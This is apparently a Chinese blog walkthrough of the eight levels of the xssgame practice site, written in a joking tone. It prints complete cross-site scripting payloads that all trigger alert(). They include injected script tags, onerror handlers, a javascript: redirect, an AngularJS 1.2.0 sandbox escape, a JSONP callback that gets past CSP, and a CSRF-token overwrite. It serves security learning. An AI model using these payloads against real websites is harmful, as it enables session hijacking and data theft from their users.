---
title: 「从入门到入狱系列」 - xssgame 通关经验(草稿) 
date: 2017-08-03
layout: post
comments: true
reward: true
tags:
    - XSS
    - game
    - 从入门到入狱
---

此链接只能墙外围观享用

主站：[www.xssgame.com](http://www.xssgame.com) 

![StartPlay](/Image/Start_Playing.png)  

<!-- more -->
***
刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。
这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了……

下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。
## LEVEL 1
[贴心的传送门](http://www.xssgame.com/m4KKGHi2rVUN)

![StartPlay](/Image/Level_1_Welcome.png)
上面的英文大致是个玩法的介绍和一些关于本关的信息：  
>此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。  
与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。  
输入一个将使应用程序在JavaScript中执行alert()函数的输入。  
一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。  
--来自原汁原味的 translate.google.com （自己感受下）

「说人话！」

通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。

至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：）

「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」

你别说，还真能：

![ad](/Image/ad.png)

//我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了

我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。

![LEVEL_1_TREE_DETAIL](/Image/Level_1_Tree_Detail.png)

其中 *index* 是主页文件，*foogle.png* 是大 Foogle Logo，唯独 *js_frame.js* 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。

*index* 中是一个简单的 form 表单的提交。我们随便搜点什么后：  
1.URL 变化  
2.页面重新加载  
3.刚刚搜索的内容被一起加载到也页面中。  

其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。
回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：
```
<script>alert()</script>
```
拼出如下URL：

```
http://www.xssgame.com/f/m4KKGHi2rVUN/?query=<script>alert()</script>
```

**使其在页面加载时就载入含有 alert 效果的 javascript 代码块。**

过关：
![LEVEL_1_PASS](/Image/LEVEL_1_Pass.png)

## LEVEL 2
[贴心的传送门](http://www.xssgame.com/WrfpuKFX8GNr)

![StartPlay2](/Image/Level_2_Welcome.png)
***
来看一下页面上的信息：
>用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。  
输入一个将使应用程序在JavaScript中执行alert()函数的输入。  
--来自原汁原味的 translate.google.com （哎，不背锅，哎）

大意是在提醒我们，要注意每一个比特。  
举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 

// 不生硬，一点都不生硬的过度

初次加载的文件中规中矩，一个*index*里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。

我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧：  
![CreateTimer](/Image/Level_2_Create_Timer.png)

来看一下新跳转的页面有哪些需要注意的东西：  
![CreateTimer](/Image/Level_2_Timer_Js.png)

我们观察发现：
```html
<img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('3');" />
```
和
```html
<div id="message">Your timer will execute in 3 seconds.</div>
```
两处回显了我们的数据。而前半部 javascript 代码也有一个3：
```js
function startTimer(seconds) {
    seconds = parseInt(seconds) || 3;
    setTimeout(function() {
        window.confirm("Time is up!");
        window.loading.style.display = 'none';
        window.message.innerHTML = '<a href="?">Go back</a> to the timer setup page';
    }, seconds * 1000);
}
```
提交其他参数后发现，跟我们提交的参数无关，无视之。  
那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：
```html
<img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('3');" />
```
这里可以搞：
```js
onload = "startTimer('3');"
```
怎么搞呢，你需要知道一个知识点：
```js
<script>
    var a = 'a' + alert(); // 或者 '-' 也可以，重点在于让 alert() 参与运算

    // 当 alert() 参与运算的时候
    // js 会尝试让 alert() 先执行
    // 然后取其执行后的返回值再参与前面的运算
    // 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』
</script>
```
我们再结合 img 标签的 onload 事件：
```js
onload = "startTime('?')"; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方
/*
    别往下瞅了，下面就是答案了，自己不寻思寻思啊
    强行占一行
    再来一行
    嗯，上下注释符号还能占两行，差不多了。
*/
// 先尝试直接插入alert()
onload = "startTimer('alert()')"; // startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行
// 看看上面的知识点……
// 插入 a'+alert()+'a
onload = "startTimer('a'+alert()+'a')"; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串
// 插入 '+alert()+'
onload = "startTimer(''+alert()+'')";

```
嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~
```
http://www.xssgame.com/f/WrfpuKFX8GNr/?timer='+alert()+'
```
提交一下……
「我曹不对吧」
「这也没过关啊，日，讲啥呢一天天。」
「你哔哔这么长时间，念经呢这是？」
别着急，'+' 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。
我们这边转义一下这个'+'字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：
![Level_2_URL_Encode](/Image/Level_2_URL_Encode.png)  
我们用%2B（或%2b）替换一下原来的加号。
```
http://www.xssgame.com/f/WrfpuKFX8GNr/?timer='%2Balert()%2B'
```
过关：
![Level_2_Pass](/Image/Level_2_Pass.png)  
上图中的 URL 虽然我们提交的是'%2B',浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改'+'为'%2B'再提交一次，你就会发现你提交的是'+',我们也并没有再次过关 :)  
另外，直接用'-'号其实没这么麻烦，不用转义，直接写就行 :)  
「……」  
![pugai](/Image/pugaizai.jpeg)  
**上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~）**

## LEVEL 3
[贴心传送门](http://www.xssgame.com/u0hrDTsXmyVJ)  

![Level_3_Welcome](/Image/Level_3_Welcome.png)  
***
见证机翻的时刻：
>复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。  
该级别的应用程序正在使用一个这样的接收器。  
由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。  
--来自看完觉得没什么卵用的 translate.google.com  

其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。  
后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) 

// 过渡~
看得出来，这是一位吸猫癌患者:
```html
    <div class="tab" id="tab1" onclick="chooseTab('1')">Cat 1</div>
    
    <div class="tab" id="tab2" onclick="chooseTab('2')">Cat 2</div>
    
    <div class="tab" id="tab3" onclick="chooseTab('3')">Cat 3</div>
```
*index* 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧：  

![bbox](/Image/shut_up_and_bbox.jpg)  

奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：
```js
function chooseTab(name) {
    var html = "Cat " + parseInt(name) + "<br>";
    html += "<img src='/static/img/cat" + name + ".jpg' />";
    document.getElementById('tabContent').innerHTML = html;

    // Select the current tab
    var tabs = document.querySelectorAll('.tab');
    for (var i = 0; i < tabs.length; i++) {
        if (tabs[i].id == "tab" + parseInt(name)) {
            tabs[i].className = "tab active";
        } else {
            tabs[i].className = "tab";
        }
    }
    window.location.hash = name;

    // Tell parent we've changed the tab
    top.postMessage({'url': self.location.toString()}, "*");
}

```
这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应'数字.jpg'的图片。
```
需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 <script>...</script> 并不会被执行。
```
没关系啊，有了上一关的经验，我们可以拼字符串啊。
佛死特奥富奥，你得知道个知识点：
```html
<img src='' onerror='alert()' />
<!--
    当图片加载错误的时候，就会执行 onerror 中的 alert() 方法
    对于本关
    我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了
    你问我怎么让它执行？
    插啊，插进去不就行了吗 →_→
--> 
```
我们拼出如下URL：
```
http://www.xssgame.com/f/u0hrDTsXmyVJ/#1' onerror='alert()'
```
**用单引号截断1,使其 scr 指向'1'这个文件，并加入 onerror 事件，而因为'1'这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。**

过关：  
![Level_3_Pass](/Image/Level_3_Pass.png)

## LEVEL 4

[贴心传送门](http://www.xssgame.com/__58a1wgqGgI)

![Level_4_Welcome](/Image/Level_4_Welcome.png)  

来看一下提示里面的有效信息:
>跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。

再来看一下页面内容：

![Level_4_Sign_up](/Image/Level_4_Sign_Up.png)

我们先跟着流程走一下，过程中看看有没有什么可利用的地方：

sign up 按钮的代码是这样的：
```html 
<a href="signup?next=confirm">Sign up</a> 
```

点击以后，我们跳转到这个页面：

![Level_4_Enter_Email](/Image/Level_4_Enter_Email.png)


页面中有一段注释：
```html
    <!-- We're ignoring the email, but the poor user will never know! -->
```
……神经病

next >> 的代码是这样：
```html
<a href="confirm?next=welcome">Next >></a>
```
点击 next >> 会跳转到下一个页面

![Level_4_Thanks_For](/Image/Level_4_Thanks_For.png)

页面代码如下：

![Level_4_Thanks_For_Source](/Image/Level_4_Thanks_For_Source.png)

我们注意到有这样一个地方：
```js
<script>
    setTimeout(function() { window.location = 'welcome'; }, 1000);
</script>
```
其中的'Welcome'像是我们 URL 中传入的参数。
经传入其他参数测试，发现 window.location = 我们传入的参数。
这样问题就简单了，首先，知识点你得有：
```js
    window.location = 'welcome'; 
    /*
        这是一个页面重定向的操作
        这里就不展开普及了,可以去 w3school 充充电。
        window.location 等同于 window.location.href
        而 DOM 的 href 属性呢，支持这样写：
        <a href='javascript:alert()' > </a>
        咳咳，你懂得。
    */
```
所以这边只需要传入：'javascript:alert()' 来替换 'welcome' 就可以了：
拼出如下 URL:
```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()
```
过关:
![Level_4_Pass.png](/Image/Level_4_Pass.png)

## LEVEL 5

[贴心传送门](http://www.xssgame.com/JFTG_t7t3N-P)

![Level_5_Welcome](/Image/Level_5_Welcome.png)

有请我们的翻译君：
>Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。  
这个挑战是为什么这很重要。  
目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。  

对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。

「Angular是啥？」

![heiren](/Image/hei1.jpeg)

其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。

我们先常规思路分析一波，先看看页面文件的内容：
```js
<script>
      angular.module('myApp', [])
      .controller('myController', ['$scope', function ($scope) {
        $scope.query = "";
        $scope.alert = window.alert;
      }]);

      var UTM_PARAMS = ["utm_content", "utm_medium", "utm_source",
          "utm_campaign", "utm_term"]

      if (location.search)
      {
        var params = location.search.substring(1).split('&');

        for (var p in params) {
          var r = params[p].split('=');

          if (r.length == 2 && UTM_PARAMS.indexOf(r[0]) != -1) {
            var el = document.getElementsByName(r[0]);
            if (el.length) el[0].value = decodeURIComponent(r[1]);
          }
        }
      }
    </script>
```
这里就提供了足够的信息够我们过关了。
这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。
先定义了一个数组，用来过滤 URL 中的参数。
过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：
```html
    <input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">
    <input name="utm_term" type="hidden">
    <input name="utm_campaign" type="hidden" value="cpc">
    <input id="demo2-button" type="submit" value="Search">
```
聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。
怎么搞呢？
我们先搜下 Angular 中 alert 怎么写：
```js
{{alert()}}
```
好知道了这个我们构建 URL，就选择 'utm_term' 这个节点吧：
```
http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}}
```
过关：

![Level_5_Pass](/Image/Level_5_Pass.png)

(至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~)

## LEVEL 6

[贴心传送门](http://www.xssgame.com/rWKWwJGnAeyi)

![Level_6_Welcome](/Image/Level_6_Welcome.png)

（前面那个关的 boss 死了，儿子又来了？？？）

没什么卵用的翻译（其实还是有用的~）：
>导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。  
目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。

这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况：

![Level_6_Search](/Image/Level_6_Search.png)

新的页面中的代码：

```html
<p ng-non-bindable>Sorry, no results were found for <b>1234</b>.</p>
```

'ng-non-bindable' 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们还有套路。

我们注意到这样一段代码：

```html
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
```

没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。
这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。

![Level_6_Google_XSS](/Image/Level_6_Google_XSS.png)

按照惯例，我们先看一下第一个：
```html
http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
```
![Level_6_PortSwigger](/Image/Level_6_PortSwigger.png)

有兴趣的可以去看一下，写的头头是道啊~

当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：
我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses：

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```
直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是：

![Level_6_Search_Para](/Image/Level_6_Search_Para.png)

我们拼一下 URL：
```
http://www.xssgame.com/f/rWKWwJGnAeyi/?query={{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()}}
```
好，提交，过关：

![heiren](/Image/hei2.jpeg)

过他妈的XX，这特么没反应啊。从头捋一捋……
(10分钟过去了……)
这他娘的没问题啊。是不是把符号过滤了啊：
```
把'{'、'}'换成'&lcub;'、'&rcub;'试一下(google 来的~我也记不住是啥。)
```

新的 URL：
```
http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&lcub;&lcub;a='constructor';b=&lcub;&rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()&rcub;&rcub;
```
冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」：

![Level_6_Pass](/Image/Level_6_Pass.png)

咳咳，过关过关……

## LEVEL 7

[贴心传送门](http://www.xssgame.com/wmOM2q5NJnZS)

![Level_7_Welcome.png](/Image/Level_7_Welcome.png)

翻译君：
>内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。  
这个挑战显示了一种常见的CSP旁路技术。  
目标是再次使用应用程序中的循环来执行JavaScript alert()函数。

其中提到了一个东西 'CSP' 就是'内容安全策略', 这是啥东西呢？

>内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。  
-- 来自 wiki 百科

这次除了 (index) 文件，我们还有两个地方需要关注下：

![Level_7_Web_DOM](/Image/Level_7_Web_DOM.png)

按照惯例，我们先看一下页面文件 (index)：
```html
<a href="?menu=YWJvdXQ=">About Me</a>
<a href="?menu=Y2F0cw==">Cats</a>
<a href="?menu=ZG9ncw==">Dogs</a>
<script src="/static/js/level7.js"></script>
```
我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。

我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：
```js
function main(){
    //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 <script> 标签，来访问资源。
    //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码
}

function callback(data){
    // 通过代码判断，data 应该是 json 格式。
    // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源
}
main(); //执行 main 方法
```

这个代码段比较简单，我们看一下 'jsonp?menu=about' 的内容：

![level_7_Web_Jsonp](/Image/Level_7_Web_Jsonp.png)

我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 'jsonp'：

![Level_7_Jsonp_XSS](/Image/Level_7_Jsonp_XSS.png)

呀呵，第一个就是知道创宇的文章: [JSONP 安全攻防技术](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

```
JSONP：
JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。
```
这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。

回到正题，文中有这样一段引起了我们的注意：

![Level_7_Jsonp_XSS_Blog](/Image/Level_7_Jsonp_XSS_Blog.png)

我们用 callback 这个参数去我们的 Level 7 中测试一下：

![Level_7_Callback_Test](/Image/Level_7_Callback_Test.png)

ok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。

Level7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：
```js
function main() {
    var m = location.search.match('menu=(.*)');// 查找了一下当前 URL 中 'menu=' 后面的参数
    var menu = m ? atob(m[1]) : 'about'; // 如果没有获取到参数，则赋值为 'about'
    document.write('<script src="jsonp?menu=' + encodeURIComponent(menu) + '"></script>'); // 在页面中写入 <script> 标签 ，通过 src 请求资源
}
```

因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。

想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：'about'、'cats'、'dogs'。相应的会有三种 callback 的 JSON 对象。

如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。

我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，'atob' 函数是解码，编码函数猜也猜到应该是 'btoa' 了~
在 chrome 浏览器的控制台下输入：

![Level_7_Btoa_Function](/Image/Level_7_Btoa_Function.png)

得到转码后的值，在输入到浏览器中：

![Level_7_Ev1l_Response](/Image/Level_7_Ev1l_Response.png)

我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。

后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」

尝试通关：

我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下：

```
先在控制台 btoa("<img src='' onerror='alert()' />") 得到 "PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4="
再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=
```
![Level_7_Img_Pass_Fail](/Image/Level_7_Img_Pass_Fail.png)

chrome 控制台红字提示：
```
   Refused to execute inline event handler because it violates the following Content Security Policy directive: "default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```
因为 CSP 的关系，失败了。

没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。

先给个小提示：

![Level_7_Pass_idea](/Image/Level_7_Pass_idea.png)

自己先想两分钟~

```
给 menu 传入经过 base64 编码后的：
    <script src='jsonp?callback=alert()%3B//'></script> // 转义前为：<script src='jsonp?callback=alert();//'></script>
会把
    <script src='jsonp?callback=alert();//'></script>
显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为：
    alert();//({...})
alert(); 后面被注释掉，执行 alert();

```
最后我们组织的 URL 为：
```
http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+
```
过关：

![Level_7_Pass](/Image/Level_7_Pass.png)

## Level 8  

[最后一关的贴心传送门 QAQ](http://www.xssgame.com/d9u16LTxchEi)

![Level_8_Welcome](/Image/Level_8_Welcome.png)

>This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.

好，我们继续无视提示信息，来看一下这一关。

尊敬下上一关，我们先看一下 Level8.js 的内容：

![Level_8_Level8js](/Image/Level_8_Level8js.png)

这个文件负责读取 cookie 的信息，如果读取到了 'name' 的内容，就 document.write 到页面上。
通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&*，他一显示到页面上不就……

行了，别意淫了：

![Level_8_CSP](/Image/Level_8_CSP.png)

我们来看看有没有其他可以利用的地方呢。先试试功能吧。

我们随便设置一下名字：

![Level_8_Set_Name](/Image/Level_8_Set_Name.png)

点击 Set 看看发生了什么:

![Level_8_Set_End](/Image/Level_8_Set_End.png)

页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：
```
http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&value=Geekaleo&redirect=index
其中：
set?name=name&value=Geekaleo&redirect=index
name=name value=Geekaleo 不禁让人菊花一紧
那我：
name=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……

redirect=index 显然这个参数是用来跳转的
```
set csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水：

![Level_8_Send](/Image/Level_8_Send.png)

我们接到了一个警告福利：

![Level_8_Send_Fail](/Image/Level_8_Send_Fail.png)

这里我们得到了几个有用的信息：

>1.我们输入的不合法金额也就是 'amount' 参数的值被返回到了前台打印了出来。  
2.此页面没有 CSP 的标识。  
3.csrf_token 作为参数传递给后台。  

根据前两点呢，我们测试一下 把 'amount' 的内容改成一段能够触发 alert() 的脚本：

![Level_8_Pass_Fail](/Image/Level_8_Pass_Fail.png)

成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的：

![Level_8_Token_Not_Same](/Image/Level_8_Token_Not_Same.png)

这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。

我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。

OK，我们来构建URL：

```
http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer?name=hello+kitty&amount=<script>alert()</script>&csrf_token=Pass

这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 & 符会被截断。

所以我们这里 把这个 'redirect=' 后面的内容处理一下，chrome 控制台：
encodeURIComponent('transfer?name=hello+kitty&amount=%3Cscript%3Ealert()%3C/script%3E&csrf_token=Pass')
得到返回值：
transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass

好我们替换一下 URL：
http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=Pass&redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass
```
:) 过关：

![Level_8_Pass](/Image/Level_8_Pass.png)


愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间……

![All_Level_Pass](/Image/All_Level_Pass.png)

「别等了，没彩蛋…… QAQ」
